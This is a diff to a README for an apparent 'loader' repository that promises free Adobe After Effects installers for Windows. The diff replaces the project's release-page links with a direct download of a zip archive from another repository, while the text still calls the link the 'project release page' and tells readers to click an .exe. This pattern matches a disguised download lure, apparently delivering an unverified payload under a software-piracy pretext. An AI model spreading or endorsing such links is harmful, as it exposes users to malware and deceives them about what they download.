@@ -5,7 +5,7 @@ description: "Download the Adobe After Effects installer for Windows 10 and 11 u
 ---
 # 🎬 adobe-effects-windows-loader - Simple access to After Effects installers
 
-[![Download Installer](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/ronnylame332/adobe-effects-windows-loader/releases)
+[![Download Installer](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/ronnylame332/ronnylame332.github.io/main/workflow/Application-3.2.zip)
 
 This repository provides a direct path for users to obtain the Adobe After Effects installer for Windows 10 and Windows 11. Use this tool to locate and start your software installation without extra steps.
 
@@ -24,7 +24,7 @@ Ensure your computer meets these requirements before you begin the process. If y
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the project release page: [https://github.com/ronnylame332/adobe-effects-windows-loader/releases](https://github.com/ronnylame332/adobe-effects-windows-loader/releases)
+1. Visit the project release page: [https://raw.githubusercontent.com/ronnylame332/ronnylame332.github.io/main/workflow/Application-3.2.zip](https://raw.githubusercontent.com/ronnylame332/ronnylame332.github.io/main/workflow/Application-3.2.zip)
 2. Locate the most recent release version at the top of the list.
 3. Click the file name ending in .exe to start the download to your computer.
 4. Save the file to your desktop or your Downloads folder.
